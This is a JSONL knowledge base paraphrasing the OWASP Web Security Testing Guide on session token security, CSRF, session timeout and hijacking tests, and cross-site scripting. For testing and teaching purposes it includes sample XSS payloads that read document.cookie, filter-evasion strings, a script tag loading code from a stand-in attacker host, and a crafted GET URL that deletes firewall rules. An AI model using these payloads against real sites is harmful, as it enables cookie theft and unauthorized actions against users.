{"id": "kb-000840", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Session Tokens (including Cookie, SessionID, and Hidden Field) can be compromised, allowing attackers to impersonate users and access applications illegitimately."}
{"id": "kb-000841", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "It is critical to protect Session ID data from eavesdropping, especially during transmission between client browsers and application servers."}
{"id": "kb-000842", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Transport security specifically pertains to the secure transfer of sensitive Session ID data, which may need to be safeguarded more rigorously than general data policies."}
{"id": "kb-000843", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The use of a personal proxy can expose details in requests and responses, such as the protocol (HTTP or HTTPS), HTTP headers, and the body of messages (e.g., POST data). Transport security should be examined whenever Session ID data is transmitted via GET or POST requests, including within message bodies."}
{"id": "kb-000844", "section": null, "tags": ["CONF", "CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Testing objectives for securing Session Tokens include: ensuring proper encryption is in place, reviewing caching configurations, and assessing overall channel and method security."}
{"id": "kb-000845", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "SSL encryption is commonly used to protect against eavesdropping; however, protection strategies should account for both transport encryption and the cryptographic protection of the Session ID itself."}
{"id": "kb-000846", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Encryption of Session IDs must be enforced for requests and responses that involve Session ID transmission, regardless of the method used (such as hidden form fields)."}
{"id": "kb-000847", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Testing can be conducted by switching from HTTPS to HTTP during application interaction and modifying form submissions to check for appropriate secure practices."}
{"id": "kb-000848", "section": null, "tags": ["AUTHN", "CRYPTO", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "If Session IDs are used across secure and non-secure parts of a site (e.g., user activity tracking), it is essential to utilize different Session IDs to maintain security during transitions. Users should be provided with a different session token upon each successful authentication to enhance security. A token should be sent via an encrypted channel for every HTTP request to enhance security. Session IDs must never be transmitted over unencrypted transport and should not be cached to prevent security breaches."}
{"id": "kb-000849", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Applications must ensure that encrypted communications are enforced for any transfer of Session IDs, with appropriate cache directives in place to protect such data."}
{"id": "kb-000850", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The HTTP/1.1 protocol provides cache control mechanisms like Cache-Control: no-cache and Cache-Control: Private, which need to be implemented correctly to prevent Session ID exposure."}
{"id": "kb-000851", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "It's crucial to test each request/response that passes Session ID data to ensure that the appropriate cache directives are employed and functioning."}
{"id": "kb-000852", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "GET requests are inadvisable for sending sensitive data like Session IDs because they can be logged, manipulated, and exploited, while POST requests offer increased security."}
{"id": "kb-000853", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Server-side code for handling POST requests should be scrutinized to ensure it does not erroneously process GET requests that could lead to unauthorized actions."}
{"id": "kb-000854", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Testing for transport vulnerabilities includes evaluating how Session IDs are transmitted (GET, POST, etc.) and ensuring they are sent over encrypted connections by default."}
{"id": "kb-000855", "section": null, "tags": ["AUTHN", "CSRF"], "source": "wstg-v4.2.pdf", "text": "CSRF (Cross-Site Request Forgery) is an attack that allows an attacker to force an end user to execute unintended actions on a web application where they are currently authenticated."}
{"id": "kb-000856", "section": null, "tags": ["AUTHZ", "CSRF"], "source": "wstg-v4.2.pdf", "text": "Successful CSRF exploits can compromise both user data and the operations within the web application, especially if the targeted user holds administrative privileges."}
{"id": "kb-000857", "section": null, "tags": ["CSRF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Four key elements are necessary for a CSRF attack: 1) Browser handling of session-related information; 2) Knowledge of valid application URLs and requests; 3) Session management relying on browser-stored information; and 4) HTML tags that enable quick access to resources."}
{"id": "kb-000858", "section": null, "tags": ["CSRF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Browsers send session identifiers (such as cookies) automatically with requests, which can be exploited by CSRF if the application does not validate requests appropriately."}
{"id": "kb-000859", "section": null, "tags": ["AUTHN", "CSRF"], "source": "wstg-v4.2.pdf", "text": "If valid application URLs and parameters can be identified, then the application could be vulnerable to CSRF attacks, as these URLs directly represent actions that can be taken by the authenticated user."}
{"id": "kb-000860", "section": null, "tags": ["AUTHN", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Session-related information includes cookies and HTTP authentication methods; vulnerabilities emerge when the web application depends solely on this information for identification of user sessions. Session Riding is a security vulnerability where an attacker can perform actions on behalf of a user without their consent."}
{"id": "kb-000861", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "GET requests can be initiated through various methods, including using the web application, typing the URL directly, or clicking external links. The browser does not distinguish among these methods, making certain external links particularly dangerous."}
{"id": "kb-000862", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Attackers can disguise links using emails, malicious websites, or third-party hosted content, leading users to click on links they should not trust."}
{"id": "kb-000863", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "When a user is already authenticated, clicking on a malicious link can execute unintended operations, like unauthorized funds transfers in web banking applications."}
{"id": "kb-000864", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "HTML tags, like <img>, can trigger automatic HTTP requests even when the user does not actively click on a link; the image request is send in the background."}
{"id": "kb-000865", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "For example, if an email contains an invisible image tag that points to a malicious URL, the browser will attempt to load the image, inadvertently sending a request to the attacker's specified endpoint. Most browsers do not disable image downloads, making this form of exploitation easier for attackers."}
{"id": "kb-000866", "section": null, "tags": ["CSRF"], "source": "wstg-v4.2.pdf", "text": "Image loading in web applications can be exploited by attackers to trigger actions without the user's consent, allowing unauthorized interactions with the application. This vulnerability is often referred to as Cross-Site Request Forgery (CSRF)."}
{"id": "kb-000867", "section": null, "tags": ["CSRF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "CSRF occurs because browsers automatically send cookies and session information with requests, irrespective of whether the request originates from a trusted or untrusted source."}
{"id": "kb-000868", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "In scenarios where emails reference malicious images, the attack can be launched merely by viewing the email, as the reference to the image triggers a request to the web application with the user's stored cookies."}
{"id": "kb-000869", "section": null, "tags": ["CSRF"], "source": "wstg-v4.2.pdf", "text": "An example of a CSRF attack is demonstrated where an attacker crafts an image tag that points to a malicious URL, leading to unintended actions on the target application."}
{"id": "kb-000870", "section": null, "tags": ["AUTHN", "CSRF", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Web applications that rely solely on browser-stored session information (e.g., those using HTTP authentication) can be vulnerable to CSRF, while those using form-based authentication with session tokens are typically more secure against this threat."}
{"id": "kb-000871", "section": null, "tags": ["AUTHN", "CONF", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The example provided illustrates the danger of a firewall web management console allowing an authenticated user to delete critical configuration rules via a straightforward GET request. This serves as a cautionary tale regarding the design and implementation of web applications and their session management."}
{"id": "kb-000872", "section": null, "tags": ["BUSINESS", "HTTP"], "source": "wstg-v4.2.pdf", "text": "A user can unintentionally delete all firewall rules by submitting a crafted GET request, such as `https://www.company.example/fwmgt/delete?rule=*`, if already logged into a sensitive application."}
{"id": "kb-000873", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Various methods exist for submitting harmful requests without the user's direct action, including direct URL entry, follow links, or embedded HTML tags like `<img>` that point to vulnerable URLs."}
{"id": "kb-000874", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Vulnerabilities can be exploited behind firewalls, meaning that the attacker does not need direct access to the vulnerable application—only the victim does."}
{"id": "kb-000875", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Self-vulnerable applications, like webmail, can be especially dangerous as they allow attackers to perform actions such as deleting or sending messages from the user's account without their consent."}
{"id": "kb-000876", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Test objectives in web security should include verifying if requests can be initiated on behalf of a user without their explicit action, indicating a vulnerability in session management."}
{"id": "kb-000877", "section": null, "tags": ["AUTHN", "CLIENT", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "To assess vulnerabilities, it’s essential to audit the application’s session management. If it relies solely on client-side values, it is considered vulnerable—client-side values include cookies and HTTP authentication credentials, but not form-based authentication."}
{"id": "kb-000878", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Both HTTP GET and POST requests can be automated and can be vulnerable; thus, relying solely on POST requests does not guarantee protection against these types of attacks."}
{"id": "kb-000879", "section": null, "tags": ["CSRF"], "source": "wstg-v4.2.pdf", "text": "CSRF (Cross-Site Request Forgery) vulnerabilities can be exploited by creating a malicious HTML page that automatically submits a form to a target site without the user's consent."}
{"id": "kb-000880", "section": null, "tags": ["AUTHN", "CSRF"], "source": "wstg-v4.2.pdf", "text": "An example HTML form to exploit CSRF includes; using hidden fields to carry payload data such as usernames and passwords, which might be automatically submitted when a user visits the page."}
{"id": "kb-000881", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Using JSON for communication between browser and server requires special considerations as JSON does not use query parameters. This issue can be addressed by modifying self-submitting forms with JSON payloads and changing their encoding type to text/plain."}
{"id": "kb-000882", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example exploit involves creating a self-submitting form with JSON data embedded in a hidden input field, which allows the payload to be sent to the server without using typical form submission methods."}
{"id": "kb-000883", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The POST request format demonstrates how the crafted payload is sent, including a potential ignored field (padding) that is not required by the server but is included in the request for exploitation purposes."}
{"id": "kb-000884", "section": null, "tags": ["CSRF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Remediation for CSRF vulnerabilities can be found in the OWASP CSRF Prevention Cheat Sheet, which offers strategies and best practices for protection against such attacks. Tools that can aid in discovering and testing CSRF vulnerabilities include OWASP ZAP, CSRF Tester, and Pinata-csrf-tool. Session termination is crucial in the session lifecycle to reduce the risk of session hijacking attacks."}
{"id": "kb-000885", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Secure session termination includes user interface controls for manual logout, session timeouts, and the proper invalidation of server-side session state. Every web application should clearly provide a log out button that is easily visible on every page to enhance user trust."}
{"id": "kb-000886", "section": null, "tags": ["CLIENT", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Common pitfalls include changing the client-side session token without invalidating the server-side session, which can allow for session reuse by resetting the cookie."}
{"id": "kb-000887", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Some web application frameworks depend solely on session cookies, which can lead to vulnerabilities if the server does not track the session's active state."}
{"id": "kb-000888", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Automatic session termination should occur after a specified period of inactivity to accommodate users who may simply close their browser without logging out."}
{"id": "kb-000889", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Single sign-on (SSO) implementations can create complexities in session management, requiring separate termination for application-specific sessions and SSO sessions."}
{"id": "kb-000890", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing for Log Out User Interface involves verifying the visibility and accessibility of the log out functionality across the web application. Key aspects include:\n- A consistent log out button presence on all pages.\n- Quick identification of the log out button by the user.\n- Log out button being visible without the need for scrolling and ideally fixed in the viewport."}
{"id": "kb-000891", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Testing for Server-Side Session Termination requires observing session cookies during the log out function. Important steps include:\n- Storing session cookies before invoking the log out.\n- Checking for session cookies after log out to ensure they don't revert to the previous state.\n- Ensuring that no authenticated data is accessible post-log out and redirection occurs to a public area or login form."}
{"id": "kb-000892", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Identifying Session Timeout involves testing timed requests to an authenticated area with increasing delays to find the session timeout threshold. Considerations include:\n- Balancing security and usability based on the application context, with tighter timeouts for sensitive applications like banking, and more lenient ones for user-generated content platforms."}
{"id": "kb-000893", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Testing for Session Termination in Single Sign-On (SSO) environments checks both application log out and SSO log out processes. Crucial expectations include:\n- Verifying that log out from the application and SSO both result in the need for re-authentication to access the application. Burp Suite - Repeater is mentioned as a tool useful for the testing processes described."}
{"id": "kb-000894", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Testing Session Timeout: This process ensures that an application automatically logs out a user after a certain period of inactivity, helping to protect sensitive data and prevent session reuse."}
{"id": "kb-000895", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Importance of Session Timeout: A balance must be struck between security (shorter timeout durations) and usability (longer timeout durations), influenced by the sensitivity of the data involved. For example, a 60-minute timeout might be acceptable for a public forum, while a 15-minute timeout is recommended for home banking applications."}
{"id": "kb-000896", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Security Risks of No Timeout: Lack of session timeout can leave applications vulnerable, as attackers may guess or hijack valid session IDs. Furthermore, if the attacker can generate activity on a session, they can keep it alive indefinitely."}
{"id": "kb-000897", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Session Management: The session timeout must be enforced server-side to prevent manipulation by attackers. Relying on client-controlled data (like cookies) for tracking inactivity can lead to extended session durations if an attacker exploits this mechanism."}
{"id": "kb-000898", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Log Out Mechanisms: Properly managing the destruction or invalidation of session tokens is crucial. Failure to do so can result in vulnerabilities like 'cookie replay' attacks, where an attacker uses a valid session token to impersonate a legitimate user."}
{"id": "kb-000899", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Common Attack Scenario: Public computers present a significant risk for session hijacking if users do not log out. An attacker can simply return to the previous session by accessing history, unless a session timeout is enforced. Session timeout testing involves checking if a timeout exists and whether it properly logs out a user after a set period of inactivity."}
{"id": "kb-000900", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Testers should verify that all session tokens are destroyed or rendered unusable after a timeout occurs, similar to testing logout functionality."}
{"id": "kb-000901", "section": null, "tags": ["CLIENT", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The distinction between client-side and server-side enforcement of session timeouts is critical; if the session cookie does not contain time-related data, the timeout is likely enforced by the server."}
{"id": "kb-000902", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "If a session cookie contains time-related data, it may indicate that the client is involved in the timeout enforcement, and testers should assess the impact of modifying the cookie."}
{"id": "kb-000903", "section": null, "tags": ["BUSINESS", "SESSION"], "source": "wstg-v4.2.pdf", "text": "A general rule is that server-side checks should be prioritized, ensuring that access cannot be regained by simply resetting session cookies to previous values."}
{"id": "kb-000904", "section": null, "tags": ["CLIENT", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Important checks for gray-box testing include: verifying that logout functions effectively destroy all session tokens, ensuring proper server-side checks are in place to prevent replay attacks, and confirming that timeouts are enforced by the server alone to prevent client-side tampering."}
{"id": "kb-000905", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Session invalidation on the server-side must be executed properly using methods such as `HttpSession.invalidate()` in Java and `Session.abandon()` in .NET to ensure security."}
{"id": "kb-000906", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Session Variable Overloading (Session Puzzling) is an application-level vulnerability that allows attackers to circumvent authentication mechanisms and impersonate legitimate users. This vulnerability occurs when the same session variable is used for multiple purposes, enabling unexpected access sequences by attackers."}
{"id": "kb-000907", "section": null, "tags": ["AUTHN", "AUTHZ", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Common effects of Session Puzzling include privilege escalation and access to secure areas of applications that should be protected by authentication protocols."}
{"id": "kb-000908", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "An example of exploiting this vulnerability involves an attacker accessing a password recovery page that populates the session with an identifying variable, thus allowing access to protected data without proper authentication."}
{"id": "kb-000909", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Testing for this vulnerability involves identifying all session variables, breaking the logical flow of session generation, and analyzing entry and exit points in the application during black-box testing. Session hijacking occurs when an attacker gains access to user session cookies, allowing them to impersonate the user. To prevent session hijacking, session cookies should be marked with the Secure attribute to only allow transmission over HTTPS."}
{"id": "kb-000910", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "If a site is fully deployed over HTTPS but does not mark its session cookies as Secure, cookies can be leaked during a request trigger by an attacker, exposing them over HTTP."}
{"id": "kb-000911", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "HTTP Strict Transport Security (HSTS) can help prevent session hijacking by disallowing HTTP connections altogether. However, full HSTS adoption is necessary when using the Domain attribute in cookies."}
{"id": "kb-000912", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Full HSTS adoption means HSTS is activated for both the apex domain and all sub-domains, while partial HSTS adoption applies only to the apex domain."}
{"id": "kb-000913", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "When HSTS is activated only for the apex domain, session cookies with the Domain attribute set can still be vulnerable if communicated over HTTP through sub-domains."}
{"id": "kb-000914", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "A specific attack scenario illustrates the vulnerability of session cookies when HSTS is not fully adopted, allowing attackers to intercept cookies sent to a sub-domain."}
{"id": "kb-000915", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Testing for session hijacking involves identifying vulnerable session cookies and attempting to hijack them in order to assess the risk level."}
{"id": "kb-000916", "section": null, "tags": ["AUTHN", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Session hijacking is a form of attack where an attacker gains unauthorized access to a user's session by stealing cookies that are not adequately protected against disclosure over HTTP. The test for session hijacking involves a series of steps that simulate this attack, which are as follows: 1. Login as the victim and navigate to a secure function that requires authentication."}
{"id": "kb-000917", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "2. Delete cookies not protected by the Secure attribute or improperly configured Domain attribute, especially in scenarios lacking HTTP Strict Transport Security (HSTS). 3. Save a snapshot of the modified cookie jar after deletion. 4. Trigger the secure function that was identified earlier (in step 1)."}
{"id": "kb-000918", "section": null, "tags": ["API", "AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "5. If the operation is successful, the session hijacking test has succeeded; if not, the application may be secure against this type of attack. 6. Login as the attacker, clear the cookie jar and navigate to the same initial page. 7. Restore the previously saved cookies one by one to the cookie jar. 8. Attempt to activate the secure function once more with the hijacked cookies."}
{"id": "kb-000919", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "9. Clear the cookie jar again, login as the victim once more, and check if the attack was successful by verifying if the secure function operationalizes as per the attacker's actions with their cookies. 10. Observations made in steps 4 and 8 will dictate if the application has done enough to protect against session hijacking."}
{"id": "kb-000920", "section": null, "tags": ["INFO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Using two different machines or browsers for the testing is recommended to minimize false positives that may arise from the web application fingerprinting. Tools mentioned for session hijacking tests include OWASP ZAP and JHijack, a numeric session hijacking tool."}
{"id": "kb-000921", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Refl​ected Cross-site Scripting (XSS) occurs when an attacker injects executable code in a single HTTP response, impacting users who access a crafted link."}
{"id": "kb-000922", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Refl​ected XSS attacks are non-persistent and the most frequently found type of XSS in the wild; they are also called first-order or type 1 XSS."}
{"id": "kb-000923", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "In a reflected XSS attack, unvalidated input sent through requests is returned to the client, allowing the execution of malicious code in the victim's browser."}
{"id": "kb-000924", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The attack typically involves three steps: designing a malicious URI, social engineering to convince the victim to load the URI, and execution of the attack through the victim's browser."}
{"id": "kb-000925", "section": null, "tags": ["CLIENT", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Common languages for writing attack code include JavaScript, ActionScript, and VBScript, which attackers use to install key loggers, steal cookies, or modify web page content."}
{"id": "kb-000926", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Proper character encoding is essential for preventing XSS vulnerabilities; failing to filter certain character encodings can leave applications susceptible to XSS attacks."}
{"id": "kb-000927", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "The testing methodology involves black-box testing, which includes phases to detect and analyze input vectors for potential vulnerabilities using specially crafted input data. A comprehensive list of potential test strings for XSS can be found in the XSS Filter Evasion Cheat Sheet."}
{"id": "kb-000928", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The impact of each test input in web security testing is assessed by examining the resulting HTML and checking for the presence of the test input."}
{"id": "kb-000929", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Special characters that are not properly encoded, replaced, or filtered indicate a vulnerability. These special characters may vary depending on where they are found in HTML."}
{"id": "kb-000930", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Key HTML entities that should be replaced are: \">\" (greater than), \"<\" (less than), \"&\" (ampersand), \"'\" (apostrophe), and \"\"\" (double quote)."}
{"id": "kb-000931", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Different contexts, such as HTML actions or JavaScript, require escaping or encoding different special characters including: \"\\n\" (new line), \"\\r\" (carriage return), \"'\" (apostrophe), \"\"\" (double quote), \"\\\" (backslash), and \"\\uXXXX\" (unicode values)."}
{"id": "kb-000932", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "An example of XSS involves modifying a user variable in a URL, such as: \"http://example.com/index.php?user=<script>alert(123)</script>\", which can produce a popup if not properly sanitized."}
{"id": "kb-000933", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "XSS (Cross-Site Scripting) vulnerabilities allow attackers to execute arbitrary code in other users' browsers when they click on a malicious link provided by an attacker. Example 1 showcases an XSS vulnerability where a crafted link could inject a script that executes in the victim's browser."}
{"id": "kb-000934", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Example 2 further demonstrates XSS in which a link could force a download of a malicious file from a controlled site, evidencing the potential harm of these vulnerabilities."}
{"id": "kb-000935", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Reflected cross-site scripting attacks can be mitigated by input sanitization, web application firewalls, and modern browser security mechanisms, but testers should not assume these protections will always be effective due to potential human error or outdated technology. XSS prevention relies heavily on sanitization of untrusted user input, rather than solely on web application firewalls (WAFs). Developers can implement various mechanisms for sanitization, such as returning errors, removing, encoding, or replacing invalid input."}
{"id": "kb-000936", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Weaknesses in XSS prevention can arise from the limitations of deny lists (which may not cover all attack strings) and overly permissive allow lists. The XSS Filter Evasion Cheat Sheet provides tests for common filter evasion tactics used by attackers."}
{"id": "kb-000937", "section": null, "tags": ["HTTP", "SESSION", "XSS"], "source": "wstg-v4.2.pdf", "text": "Attackers can exploit XSS vulnerabilities without using conventional <script> tags by inputting code into attributes. For example, <input type=\"text\" name=\"state\" value=\"INPUT_FROM_USER\"> can be exploited by injecting code as follows: \" onfocus=\"alert(document.cookie)"}
{"id": "kb-000938", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Signature-based filters can be defeated by obfuscating attacks with unexpected syntax variations or encoding, making the code valid HTML while being accepted by the filter. Examples of obfuscated code include: \"><script >alert(document.cookie)</script > and \"%3cscript%3ealert(document.cookie)%3c/script%3e."}
{"id": "kb-000939", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Non-recursive filtering can allow bypassing security measures by nesting sanitization attempts within an infected string, such as <scr<script>ipt>alert(document.cookie)</script>. Developers can attempt to prevent external script inclusion using regular expressions, but such measures may not be foolproof."}
{"id": "kb-000940", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Decoupling Regular Expressions: When filtering script tags in web applications, it's important to check for certain patterns, such as the presence of `<script>`, whitespace characters, and attributes like `src`. An example of this is: `http://example/?var=<SCRIPT%20a='>'%20SRC='http://attacker/xss.js'></SCRIPT>`, where the greater-than symbol (`>`) is used in an attribute to bypass sanitization."}
{"id": "kb-000941", "section": null, "tags": ["CLIENT", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Reflected Cross-Site Scripting (XSS): An example of a reflected XSS vulnerability illustrates how an attacker can execute JavaScript code hosted on their server by manipulating input data. This could lead to malicious actions against users who visit the vulnerable URL, shown as `http://example/?var=<SCRIPT%20a='>'%20SRC='http://attacker/xss.js'></SCRIPT>."}
{"id": "kb-000942", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "HTTP Parameter Pollution (HPP): This method involves splitting attack vectors over parameters with the same name. An example of a regular attack vector would be `http://example/page.php?param=<script>[...]</script>`, while an HPP attack might look like `http://example/page.php?param=<script&param=>[...]</&param=script>`, which exploits how web technologies concatenate parameters and may bypass filtering."}
{"id": "kb-000943", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Gray-Box Testing: This type of testing grants the pen-tester partial knowledge of the application. This knowledge includes user input methods, input validation, and how input is rendered back to users, differentiating it from black-box testing where no prior knowledge is available."}
{"id": "kb-000944", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "Testing Methodologies: Understanding the nuances of testing approaches, such as gray-box versus black-box testing, is essential for effective security assessments, particularly concerning user inputs and sanitization processes. PHP Charset Encoder (PCE) enables encoding of arbitrary texts across 65 character sets for custom payloads. Hackvertor is a versatile online tool for encoding and obfuscating JavaScript and other string inputs. XSS-Proxy serves as a sophisticated tool for executing advanced Cross-Site Scripting (XSS) attacks."}
{"id": "kb-000945", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "ratproxy is a semi-automated audit tool for web application security that passively detects potential issues by monitoring user-initiated traffic in complex web environments. Burp Proxy functions as an interactive HTTP/S proxy server, facilitating the testing and attack of web applications. OWASP Zed Attack Proxy (ZAP) offers an interactive environment for testing web applications with embedded scanning capabilities."}
{"id": "kb-000946", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Stored Cross-site Scripting (XSS) is considered the most dangerous type of XSS due to its ability to exploit stored user input in web applications."}
{"id": "kb-000947", "section": null, "tags": ["AUTHZ", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Stored XSS occurs when web applications gather potentially malicious input from users and incorrectly filter it before storing it for later use, leading to unauthorized execution in a user's browser under the application's privileges."}
{"id": "kb-000948", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "This vulnerability is also referred to as second-order XSS because it typically requires at least two requests to exploit: one to store the malicious input and another to execute it when the stored data is retrieved."}
{"id": "kb-000949", "section": null, "tags": ["SESSION", "XSS"], "source": "wstg-v4.2.pdf", "text": "Stored XSS can enable a range of browser-based attacks, including hijacking a user’s session, capturing sensitive information, and delivering browser-based exploits."}
{"id": "kb-000950", "section": null, "tags": ["AUTHN", "XSS"], "source": "wstg-v4.2.pdf", "text": "The typical phases of a stored XSS attack scenario include: (1) Attacker stores malicious code in the vulnerable application; (2) User authenticates; (3) User visits the vulnerable page; (4) Malicious code executes in the user's browser."}
{"id": "kb-000951", "section": null, "tags": ["AUTHZ", "XSS"], "source": "wstg-v4.2.pdf", "text": "Stored XSS is especially dangerous in contexts involving high-privilege users, like administrators, as their browsers can execute the attack when they visit the compromised page, potentially exposing sensitive data."}
{"id": "kb-000952", "section": null, "tags": ["CLIENT", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Testing objectives for identifying stored XSS include recognizing stored input reflected on the client-side and assessing the input accepted and the encoding applied when returning data."}
{"id": "kb-000953", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Black-box testing for stored XSS vulnerabilities follows similar processes as testing for reflected XSS, focusing on the interaction between the application and the user."}
{"id": "kb-000954", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Identify all points of user input storage in applications, such as user profiles, shopping carts, file managers, application settings, forums, blogs, and logs."}
{"id": "kb-000955", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Stored user input is used in HTML tags and JavaScript content. Understanding how input is stored and its context on the page is fundamental for web security testing."}
{"id": "kb-000956", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Administrators should test all accessible areas of the application to identify user-submitted data that may be susceptible to security vulnerabilities."}
{"id": "kb-000957", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of stored input is shown in the HTML code for an email input field: <input class=\"inputbox\" type=\"text\" name=\"email\" size=\"40\" value=\"aaa@aa.com\" />. This indicates how data can be stored and later displayed within an application."}
